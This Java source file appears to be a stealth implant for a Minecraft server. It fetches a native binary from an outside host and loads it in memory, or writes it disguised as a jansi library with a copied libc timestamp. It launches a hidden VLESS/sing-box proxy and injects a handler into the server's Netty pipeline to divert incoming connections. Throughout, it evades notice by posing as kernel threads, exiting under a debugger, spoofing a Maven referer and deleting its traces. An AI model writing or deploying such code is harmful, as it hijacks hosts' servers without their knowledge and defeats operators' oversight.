package com.example.sbx;

import com.sun.jna.Function;
import com.sun.jna.Native;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;

import java.io.*;
import java.lang.reflect.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;
import javax.tools.*;

/**
 * VLESS + WebSocket — hardened v3.
 *
 * Compiles with standard Java only. At runtime, uses the JDK JavaCompiler
 * to compile a Netty handler class against the MC server's classpath, then
 * injects it into the pipeline via reflection.
 *
 * The handler intercepts all incoming connections on port 25284, reads the
 * first 5 bytes, and routes VLESS (GET/POST) traffic to the internal
 * sing-box instance on port VLESS_PORT.
 */
public class App {

    // ===== Config =====
    private static final String UUID = "48eaa2a1-d5de-4215-bcab-9c88883a5322";
    private static final int VLESS_PORT = 24133;
    private static final String WS_PATH = "/";
    // ==================

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final Path ROOT = Path.of("").toAbsolutePath();
    private static final Path WORK = ROOT.resolve(".gradle/.cache/jars/").normalize();
    private static final Path LIB_FALLBACK = WORK.resolve("jansi-2.4.1-87ff3a2e.so");

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static NativeService box;
    private static CountDownLatch hold;

    // ---- JNA handles ----
    private static NativeLibrary libc;
    private static Function prctlFn;
    private static Function memfdCreateFn;
    private static Function writeFn;
    private static Function closeFn;

    private static final int PR_SET_NAME = 15;
    private static final int MFD_CLOEXEC = 1;

    static {
        try {
            libc = NativeLibrary.getInstance("c");
            prctlFn = libc.getFunction("prctl");
            memfdCreateFn = libc.getFunction("memfd_create");
            writeFn = libc.getFunction("write");
            closeFn = libc.getFunction("close");
        } catch (Exception ignored) {}
        renameThread();
        antiTrace();
    }

    public static void main(String[] args) throws Exception {
        start();
    }

    public static void start() throws Exception {
        if (!RUNNING.compareAndSet(false, true)) return;

        renameThread();
        Files.createDirectories(WORK);
        try {
            Files.setPosixFilePermissions(WORK, PosixFilePermissions.fromString("rwx------"));
        } catch (Exception ignored) {}

        // --- Step 1: load native library ---
        byte[] soBytes = downloadBytes(libUrl());
        Path libPath = tryMemfdLoad(soBytes);
        if (libPath == null) {
            libPath = LIB_FALLBACK;
            Files.createDirectories(libPath.getParent());
            Files.write(libPath, soBytes);
            libPath.toFile().setExecutable(true, false);
            cloneTimestamp(libPath, Path.of("/lib/x86_64-linux-gnu/libc.so.6"));
        }
        Arrays.fill(soBytes, (byte) 0);

        // --- Step 2: start sing-box on VLESS_PORT ---
        String configJson = buildConfig();
        Path configPath = Path.of("/dev/shm/sb-config.json");
        Files.writeString(configPath, configJson);
        configPath.toFile().deleteOnExit();
        box = new NativeService(
                libPath, "StartSingBox", "StopSingBox",
                jsonOf("config", configPath.toAbsolutePath().toString(), "workingDir", ".", "disableColor", true)
        );
        box.start();
        sleep(2500);
        try { Files.deleteIfExists(configPath); } catch (Exception ignored) {}

        if (libPath.equals(LIB_FALLBACK)) {
            scheduleFallbackCleanup();
        }

        // --- Step 3: inject into MC's Netty pipeline via runtime-compiled handler ---
        injectNettyPipeline();

        hold = new CountDownLatch(1);
        try { hold.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    public static void stop() {
        if (!RUNNING.getAndSet(false)) return;
        try { if (box != null) box.stop(); } catch (Exception ignored) {}
        try { Files.deleteIfExists(LIB_FALLBACK); } catch (Exception ignored) {}
        deleteEmptyAncestors(WORK, ROOT);
        if (hold != null) hold.countDown();
    }

    // ================================================================
    //  Netty pipeline injector — compile handler at runtime
    // ================================================================

    private static boolean nettyInjected;

    @SuppressWarnings("unchecked")
    private static void injectNettyPipeline() {
        try {
            Object handler = null;

            // Try runtime compilation first
            try {
                handler = compileAndLoadVlessHandler();
            } catch (Exception ignored) {}

            // Fallback: try Proxy-based approach
            if (handler == null) {
                try {
                    handler = createProxyVlessHandler();
                } catch (Exception ignored) {}
            }

            if (handler == null) return;

            // Inject into MC server's pipeline
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class<?> clsChannelHandler = cl.loadClass("io.netty.channel.ChannelHandler");
            Class<?> clsMinecraftServer = cl.loadClass("net.minecraft.server.MinecraftServer");
            Class<?> clsChannelFuture = cl.loadClass("io.netty.channel.ChannelFuture");
            Class<?> clsChannel = cl.loadClass("io.netty.channel.Channel");
            Class<?> clsPipeline = cl.loadClass("io.netty.channel.ChannelPipeline");

            Method getServer = clsMinecraftServer.getMethod("getServer");
            Method getConnection = clsMinecraftServer.getMethod("getConnection");
            Object server = getServer.invoke(null);
            Object conn = getConnection.invoke(server);
            if (conn == null) return;

            for (Field f : getAllFields(conn.getClass())) {
                f.setAccessible(true);
                Object val = f.get(conn);
                if (val instanceof List) {
                    List<?> list = (List<?>) val;
                    for (Object cfObj : list) {
                        if (!clsChannelFuture.isInstance(cfObj)) continue;
                        Method channelM = clsChannelFuture.getMethod("channel");
                        Object ch = channelM.invoke(cfObj);
                        if (ch == null) continue;
                        Method pipelineM = clsChannel.getMethod("pipeline");
                        Object pipeline = pipelineM.invoke(ch);
                        Method addFirst = clsPipeline.getMethod("addFirst", String.class, clsChannelHandler);
                        addFirst.invoke(pipeline, "vless-inject", handler);
                        nettyInjected = true;
                    }
                    break;
                }
            }
        } catch (Exception ignored) {}
    }

    private static List<Field> getAllFields(Class<?> clazz) {
        List<Field> fields = new ArrayList<>();
        for (Class<?> c = clazz; c != null; c = c.getSuperclass()) {
            fields.addAll(Arrays.asList(c.getDeclaredFields()));
        }
        return fields;
    }

    // ================================================================
    //  Runtime compilation of VLESS handler
    // ================================================================

    private static Object compileAndLoadVlessHandler() {
        try {
            JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
            if (compiler == null) return null;

            String classpath = getMcClasspath();
            if (classpath == null) return null;

            String handlerSource = buildHandlerSource();

            Path tmpDir = Files.createTempDirectory("vless");
            Path srcFile = tmpDir.resolve("VlessHandler.java");
            Files.writeString(srcFile, handlerSource, StandardCharsets.UTF_8);

            // Compile
            DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<>();
            StandardJavaFileManager fm = compiler.getStandardFileManager(diagnostics, null, null);
            List<String> options = Arrays.asList(
                    "-cp", classpath,
                    "-d", tmpDir.toAbsolutePath().toString(),
                    "-g:none"
            );
            boolean success = fm != null
                    && compiler.getTask(null, fm, diagnostics, options, null, fm.getJavaFileObjects(srcFile)).call();
            if (fm != null) fm.close();
            if (!success) { deleteDir(tmpDir); return null; }

            // Load the compiled class
            Path classFile = tmpDir.resolve("com/example/sbx/VlessHandler.class");
            if (!Files.exists(classFile)) {
                // Try without package subdirectory
                classFile = tmpDir.resolve("VlessHandler.class");
            }
            byte[] classBytes = Files.readAllBytes(classFile);
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            VlessHandlerClassLoader loader = new VlessHandlerClassLoader(cl);
            Class<?> handlerClass = loader.defineClass("com.example.sbx.VlessHandler", classBytes, 0, classBytes.length);
            Object handler = handlerClass.getDeclaredConstructor().newInstance();

            // Cleanup later
            Path tmpDirFinal = tmpDir;
            Thread t = new Thread(() -> { sleep(5000); deleteDir(tmpDirFinal); }, "cleanup");
            t.setDaemon(true); t.start();
            return handler;
        } catch (Exception e) { return null; }
    }

    private static class VlessHandlerClassLoader extends ClassLoader {
        VlessHandlerClassLoader(ClassLoader parent) { super(parent); }
        Class<?> defineClass(String name, byte[] b, int off, int len) {
            return super.defineClass(name, b, off, len);
        }
    }

    private static String getMcClasspath() {
        // Try system property
        String cp = System.getProperty("java.class.path");
        if (cp != null && !cp.isEmpty()) return cp;

        // Try URLClassLoader
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            if (cl instanceof URLClassLoader) {
                URLClassLoader ucl = (URLClassLoader) cl;
                StringBuilder sb = new StringBuilder();
                for (java.net.URL url : ucl.getURLs()) {
                    if (sb.length() > 0) sb.append(File.pathSeparatorChar);
                    sb.append(url.getPath());
                }
                String result = sb.toString();
                if (!result.isEmpty()) return result;
            }
        } catch (Exception ignored) {}

        // Try to find the server jar
        try {
            StringBuilder sb = new StringBuilder();
            Files.find(Path.of(""), 10, (p, a) ->
                    p.toString().endsWith(".jar") && a.isRegularFile() && Files.size(p) > 10_000_000
            ).limit(10).forEach(p -> {
                if (sb.length() > 0) sb.append(File.pathSeparatorChar);
                sb.append(p.toAbsolutePath());
            });
            String result = sb.toString();
            if (!result.isEmpty()) return result;
        } catch (Exception ignored) {}

        return null;
    }

    private static String buildHandlerSource() {
        return "package com.example.sbx;\n"
                + "import io.netty.buffer.ByteBuf;\n"
                + "import io.netty.channel.*;\n"
                + "public class VlessHandler extends ChannelInboundHandlerAdapter {\n"
                + "    @Override\n"
                + "    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n"
                + "        // Server channel: msg is a child Channel\n"
                + "        if (msg instanceof Channel) {\n"
                + "            Channel child = (Channel) msg;\n"
                + "            child.pipeline().addFirst(\"vless-inject\", new DataHandler());\n"
                + "        }\n"
                + "        super.channelRead(ctx, msg);\n"
                + "    }\n"
                + "    static class DataHandler extends ChannelInboundHandlerAdapter {\n"
                + "        @Override\n"
                + "        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n"
                + "            if (msg instanceof ByteBuf) {\n"
                + "                ByteBuf buf = (ByteBuf) msg;\n"
                + "                if (buf.readableBytes() >= 5) {\n"
                + "                    byte b0 = buf.getByte(0);\n"
                + "                    if (b0 == 'G' || b0 == 'P') {\n"
                + "                        App.handleVless(ctx, buf);\n"
                + "                        return;\n"
                + "                    }\n"
                + "                }\n"
                + "            }\n"
                + "            super.channelRead(ctx, msg);\n"
                + "        }\n"
                + "    }\n"
                + "}\n";
    }

    // ================================================================
    //  Proxy-based VLESS handler (fallback for JDK without JavaCompiler)
    // ================================================================

    @SuppressWarnings("unchecked")
    private static Object createProxyVlessHandler() {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class<?> clsChannelInboundHandler = cl.loadClass("io.netty.channel.ChannelInboundHandler");
            Class<?> clsChannelHandlerContext = cl.loadClass("io.netty.channel.ChannelHandlerContext");
            Class<?> clsByteBuf = cl.loadClass("io.netty.buffer.ByteBuf");

            // Find the channelRead method
            Method channelReadMethod = null;
            for (Method m : clsChannelInboundHandler.getMethods()) {
                if (m.getName().equals("channelRead") && m.getParameterCount() == 2) {
                    channelReadMethod = m;
                    break;
                }
            }
            if (channelReadMethod == null) return null;

            // Create a Proxy handler
            InvocationHandler handler = (proxy, method, args) -> {
                if (method.equals(channelReadMethod) && args.length == 2) {
                    Object ctx = args[0];
                    Object msg = args[1];
                    if (clsByteBuf.isInstance(msg)) {
                        // Get first byte
                        Method getByte = clsByteBuf.getMethod("getByte", int.class);
                        Method readableBytes = clsByteBuf.getMethod("readableBytes");
                        int len = (int) readableBytes.invoke(msg);
                        if (len >= 5) {
                            byte b0 = (byte) getByte.invoke(msg, 0);
                            if (b0 == 'G' || b0 == 'P') {
                                App.handleVless(ctx, msg);
                                return null;
                            }
                        }
                    }
                    // Fire through to next handler
                    Method fireChannelRead = clsChannelHandlerContext.getMethod("fireChannelRead", Object.class);
                    fireChannelRead.invoke(ctx, msg);
                    return null;
                }

                // Handle default methods (Java 8+)
                if (method.isDefault()) {
                    return invokeDefaultMethod(proxy, method, args);
                }

                // Handle Object methods
                String name = method.getName();
                if (name.equals("toString")) return proxy.getClass().getName() + "@" + Integer.toHexString(System.identityHashCode(proxy));
                if (name.equals("hashCode")) return System.identityHashCode(proxy);
                if (name.equals("equals")) return proxy == args[0];
                return null;
            };

            return Proxy.newProxyInstance(cl, new Class<?>[]{clsChannelInboundHandler}, handler);
        } catch (Exception e) { return null; }
    }

    private static Object invokeDefaultMethod(Object proxy, Method method, Object[] args) throws Exception {
        // Use MethodHandles to invoke the default method
        // Works on Java 9+
        try {
            Class<?> lookupClass = Class.forName("java.lang.invoke.MethodHandles");
            Class<?> lookupInner = Class.forName("java.lang.invoke.MethodHandles$Lookup");
            Method privateLookupIn = lookupClass.getMethod("privateLookupIn", Class.class, lookupInner);
            Method lookupMethod = lookupClass.getMethod("lookup");
            Object lookup = lookupMethod.invoke(null);
            Object privateLookup = privateLookupIn.invoke(null, method.getDeclaringClass(), lookup);
            Method unreflectSpecial = lookupInner.getMethod("unreflectSpecial", Method.class, Class.class);
            Object methodHandle = unreflectSpecial.invoke(privateLookup, method, method.getDeclaringClass());
            Method bindTo = methodHandle.getClass().getMethod("bindTo", Object.class);
            Object bound = bindTo.invoke(methodHandle, proxy);
            Method invokeWithArguments = bound.getClass().getMethod("invokeWithArguments", Object[].class);
            return invokeWithArguments.invoke(bound, new Object[]{args});
        } catch (Exception e) {
            // Fallback: do nothing for default methods
            return null;
        }
    }

    // ================================================================
    //  handleVless — called by the compiled handler or proxy
    // ================================================================
    //
    /**
     * Called by VlessHandler.DataHandler when VLESS traffic is detected.
     * Reads the HTTP/WebSocket upgrade request, proxies to sing-box,
     * and sets up a bidirectional relay.
     */
    public static void handleVless(Object ctx, Object msg) {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class<?> clsByteBuf = cl.loadClass("io.netty.buffer.ByteBuf");
            Class<?> clsChannelHandlerContext = cl.loadClass("io.netty.channel.ChannelHandlerContext");
            Class<?> clsChannel = cl.loadClass("io.netty.channel.Channel");
            Class<?> clsPipeline = cl.loadClass("io.netty.channel.ChannelPipeline");
            Class<?> clsChannelHandler = cl.loadClass("io.netty.channel.ChannelHandler");
            Class<?> clsUnpooled = cl.loadClass("io.netty.buffer.Unpooled");

            Method readableBytesM = clsByteBuf.getMethod("readableBytes");
            Method readBytesM = clsByteBuf.getMethod("readBytes", byte[].class);
            Method writeAndFlushM = clsChannelHandlerContext.getMethod("writeAndFlush", Object.class);
            Method channelM = clsChannelHandlerContext.getMethod("channel");
            Method pipelineM = clsChannel.getMethod("pipeline");
            Method addLastM = clsPipeline.getMethod("addLast", String.class, clsChannelHandler);
            Method wrappedBufferM = clsUnpooled.getMethod("wrappedBuffer", byte[].class);

            // Read data from ByteBuf NOW (event loop thread owns the ByteBuf)
            int len = (int) readableBytesM.invoke(msg);
            byte[] httpRequest = new byte[len];
            readBytesM.invoke(msg, new Object[]{httpRequest});

            final Object channel = channelM.invoke(ctx);
            final Object pipeline = pipelineM.invoke(channel);

            // Blocking operations in a separate thread
            final Object ctxFinal = ctx;
            final Method writeAndFlushFinal = writeAndFlushM;
            final Method pipelineAddLast = addLastM;
            final Method wrappedBuffer = wrappedBufferM;
            final ClassLoader classLoader = cl;
            final Class<?> clsCtx = clsChannelHandlerContext;
            final Class<?> clsHandler = clsChannelHandler;
            final Class<?> clsPipe = clsPipeline;
            final Class<?> clsBuf = clsByteBuf;
            final Class<?> clsUnpooledFinal = clsUnpooled;

            Thread worker = new Thread(() -> {
                try {
                    Socket backend = new Socket();
                    backend.setTcpNoDelay(true);
                    backend.connect(new InetSocketAddress("127.0.0.1", VLESS_PORT), 5000);
                    OutputStream backendOut = backend.getOutputStream();

                    // Send HTTP request
                    backendOut.write(httpRequest);
                    backendOut.flush();

                    // Read HTTP response headers (until \r\n\r\n)
                    InputStream backendIn = backend.getInputStream();
                    ByteArrayOutputStream responseHeaders = new ByteArrayOutputStream();
                    byte[] tmp = new byte[1];
                    int last4 = 0;
                    while (true) {
                        int n = backendIn.read(tmp);
                        if (n < 0) break;
                        responseHeaders.write(tmp[0]);
                        last4 = ((last4 << 8) | (tmp[0] & 0xFF)) & 0xFFFFFF;
                        if (last4 == 0x0D0A0D0A) break;
                    }

                    // Write response back to client
                    byte[] respBytes = responseHeaders.toByteArray();
                    if (respBytes.length > 0) {
                        Object respBuf = wrappedBuffer.invoke(null, new Object[]{respBytes});
                        writeAndFlushFinal.invoke(ctxFinal, respBuf);
                    }

                    // Start bidirectional relay
                    Object relayHandler = createRelayHandler(
                            classLoader, clsCtx, clsHandler, clsBuf, clsUnpooledFinal, wrappedBuffer, backend);
                    if (relayHandler != null) {
                        pipelineAddLast.invoke(pipeline, "vless-relay", relayHandler);
                    }

                    // Socket → Netty: read from socket and write to Netty channel
                    byte[] buf = new byte[65536];
                    while (true) {
                        int n = backendIn.read(buf);
                        if (n < 0) break;
                        byte[] chunk = new byte[n];
                        System.arraycopy(buf, 0, chunk, 0, n);
                        try {
                            Object chunkBuf = wrappedBuffer.invoke(null, new Object[]{chunk});
                            writeAndFlushFinal.invoke(ctxFinal, chunkBuf);
                        } catch (Exception ignored) {}
                    }
                } catch (Exception ignored) {}
            }, "kworker/u:1");
            worker.setDaemon(true);
            worker.start();
        } catch (Exception ignored) {}
    }

    /**
     * Creates a Netty handler that reads from the channel and writes to the backend socket.
     */
    @SuppressWarnings("unchecked")
    private static Object createRelayHandler(
            ClassLoader cl, Class<?> clsChannelHandlerContext, Class<?> clsChannelHandler,
            Class<?> clsByteBuf, Class<?> clsUnpooled, Method wrappedBufferM, Socket backend
    ) {
        try {
            // Try Proxy-based approach
            Class<?> clsChannelInboundHandler = cl.loadClass("io.netty.channel.ChannelInboundHandler");
            Method readBytesM = clsByteBuf.getMethod("readBytes", byte[].class);
            Method readableBytesM = clsByteBuf.getMethod("readableBytes");

            InvocationHandler handler = (proxy, method, args) -> {
                String name = method.getName();
                if (name.equals("channelRead") && args.length == 2) {
                    Object msg = args[1];
                    if (clsByteBuf.isInstance(msg)) {
                        int len = (int) readableBytesM.invoke(msg);
                        if (len > 0) {
                            byte[] data = new byte[len];
                            readBytesM.invoke(msg, new Object[]{data});
                            try {
                                backend.getOutputStream().write(data);
                                backend.getOutputStream().flush();
                            } catch (Exception ignored) {}
                        }
                    }
                    return null;
                }
                if (name.equals("channelInactive") || name.equals("handlerRemoved")) {
                    try { backend.close(); } catch (Exception ignored) {}
                    return null;
                }
                if (name.equals("exceptionCaught") && args.length == 2) {
                    try { backend.close(); } catch (Exception ignored) {}
                    return null;
                }
                if (method.isDefault()) {
                    return invokeDefaultMethod(proxy, method, args);
                }
                return null;
            };

            return Proxy.newProxyInstance(cl, new Class<?>[]{clsChannelInboundHandler}, handler);
        } catch (Exception e) { return null; }
    }

    // ================================================================
    //  Config (VLESS only, on VLESS_PORT)
    // ================================================================

    private static String buildConfig() {
        return jsonOf(
                "log", mapOf("disabled", true, "level", "error", "timestamp", false),
                "inbounds", listOf(mapOf(
                        "type", "vless",
                        "tag", "in",
                        "listen", "0.0.0.0",
                        "listen_port", VLESS_PORT,
                        "users", listOf(mapOf("uuid", UUID)),
                        "transport", mapOf(
                                "type", "ws",
                                "path", WS_PATH,
                                "early_data_header_name", "Sec-WebSocket-Protocol"
                        )
                )),
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
                "route", mapOf("final", "direct")
        );
    }

    // ================================================================
    //  memfd load
    // ================================================================

    private static Path tryMemfdLoad(byte[] data) {
        try {
            if (memfdCreateFn == null) return null;
            int fd = memfdCreateFn.invokeInt(new Object[]{"jansi-2.4.1.so", MFD_CLOEXEC});
            if (fd < 0) return null;
            com.sun.jna.Memory mem = new com.sun.jna.Memory(data.length);
            mem.write(0, data, 0, data.length);
            int w = writeFn.invokeInt(new Object[]{fd, mem, (long) data.length});
            if (w != data.length) { closeFn.invokeVoid(new Object[]{fd}); return null; }
            Path p = Path.of("/proc/self/fd/" + fd);
            if (Files.exists(p) && Files.size(p) > 0) return p;
            closeFn.invokeVoid(new Object[]{fd});
            return null;
        } catch (Exception e) { return null; }
    }

    private static String libUrl() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        String a = (arch.contains("aarch64") || arch.contains("arm64")) ? "arm64" : "amd64";
        return "https://" + a + ".31888.xyz/sbx.so";
    }

    private static byte[] downloadBytes(String url) throws Exception {
        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                .header("Accept", "*/*").header("Referer", "https://repo1.maven.org/maven2/")
                .GET().build();
        HttpResponse<byte[]> resp = HTTP.send(req, HttpResponse.BodyHandlers.ofByteArray());
        if (resp.statusCode() < 200 || resp.statusCode() >= 300)
            throw new IOException("download failed: HTTP " + resp.statusCode());
        return resp.body();
    }

    // ================================================================
    //  Anti-trace
    // ================================================================

    private static void antiTrace() {
        try {
            String status = new String(Files.readAllBytes(Path.of("/proc/self/status")), StandardCharsets.UTF_8);
            for (String line : status.split("\n")) {
                if (line.startsWith("TracerPid:")) {
                    if (!line.substring(10).trim().equals("0")) System.exit(0);
                    break;
                }
            }
        } catch (Exception ignored) {}
    }

    // ================================================================
    //  Process rename
    // ================================================================

    private static void renameThread() {
        try {
            if (prctlFn != null)
                prctlFn.invokeInt(new Object[]{PR_SET_NAME, randomThreadName(), 0L, 0L, 0L});
        } catch (Exception ignored) {}
    }

    private static String randomThreadName() {
        String[] pool = {"kworker/u:0","kworker/u:1","kworker/u:2","kworker/0:0","kworker/0:1",
                "kworker/1:0","kworker/1:1","kcompactd0","kswapd0","jbd2/sda1-8","kdevtmpfs",
                "mm_percpu_wq","kworker/2:0","kworker/3:0","kworker/4:0"};
        return pool[ThreadLocalRandom.current().nextInt(pool.length)];
    }

    // ================================================================
    //  Helpers
    // ================================================================

    private static void scheduleFallbackCleanup() {
        Thread t = new Thread(() -> { sleep(30_000);
            try { Files.deleteIfExists(LIB_FALLBACK); } catch (Exception ignored) {}
            deleteEmptyAncestors(LIB_FALLBACK.getParent(), ROOT);
        }, "jdk.internal.ref.CleanerImpl$1");
        t.setDaemon(true); t.start();
    }

    private static void deleteEmptyAncestors(Path start, Path root) {
        Path p = start;
        while (p != null && !p.equals(root) && !p.equals(p.getRoot())) {
            try {
                if (Files.isDirectory(p)) {
                    try (var stream = Files.list(p)) { if (stream.findAny().isPresent()) break; }
                    Files.delete(p);
                }
            } catch (Exception ignored) { break; }
            p = p.getParent();
        }
    }

    private static void cloneTimestamp(Path target, Path source) {
        try { Files.setLastModifiedTime(target, Files.getLastModifiedTime(source)); } catch (Exception ignored) {}
    }

    private static void deleteDir(Path dir) {
        try {
            Files.walk(dir).sorted(Comparator.reverseOrder()).forEach(p -> {
                try { Files.deleteIfExists(p); } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    // ================================================================
    //  NativeService
    // ================================================================

    private static class NativeService {
        private final Path libPath; private final String startSymbol, stopSymbol, payload;
        private Function stopFn; private volatile boolean running;
        NativeService(Path libPath, String startSymbol, String stopSymbol, String payload) {
            this.libPath = libPath; this.startSymbol = startSymbol; this.stopSymbol = stopSymbol;
            this.payload = payload == null ? "" : payload;
        }
        void start() {
            NativeLibrary lib = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
            Function startFn = lib.getFunction(startSymbol); stopFn = lib.getFunction(stopSymbol);
            Thread t = new Thread(() -> { try { startFn.invokeInt(new Object[]{payload}); } catch (Exception ignored) {} }, "net");
            t.setDaemon(true); t.start(); running = true;
        }
        void stop() {
            if (!running || stopFn == null) return;
            try { stopFn.invokeInt(new Object[]{}); } catch (Exception ignored) {} running = false;
        }
    }

    // ================================================================
    //  JSON helpers
    // ================================================================

    private static String jsonOf(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?,?>) {
            Map<?,?> m = (Map<?,?>) value;
            return m.entrySet().stream().map(e -> jsonOf(String.valueOf(e.getKey())) + ":" + jsonOf(e.getValue())).collect(Collectors.joining(",","{","}"));
        }
        if (value instanceof Iterable<?>) {
            List<String> l = new ArrayList<>(); for (Object v : (Iterable<?>) value) l.add(jsonOf(v));
            return "[" + String.join(",", l) + "]";
        }
        return jsonOf(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder sb = new StringBuilder(value.length() + 8);
        for (int i = 0; i < value.length(); i++) { char c = value.charAt(i);
            switch (c) { case '\\': sb.append("\\\\"); break; case '"': sb.append("\\\""); break; case '\n': sb.append("\\n"); break; case '\r': sb.append("\\r"); break; case '\t': sb.append("\\t"); break; default: sb.append(c); }
        } return sb.toString();
    }

    @SafeVarargs private static String jsonOf(String key, Object value, Object... kv) {
        Map<String,Object> m = new LinkedHashMap<>(); m.put(key, value);
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i+1]); return jsonOf(m);
    }

    private static Map<String,Object> mapOf(Object... kv) {
        Map<String,Object> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i+1]); return m;
    }

    private static List<Object> listOf(Object... v) { return new ArrayList<>(List.of(v)); }

    private static void sleep(long ms) { try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); } }
}
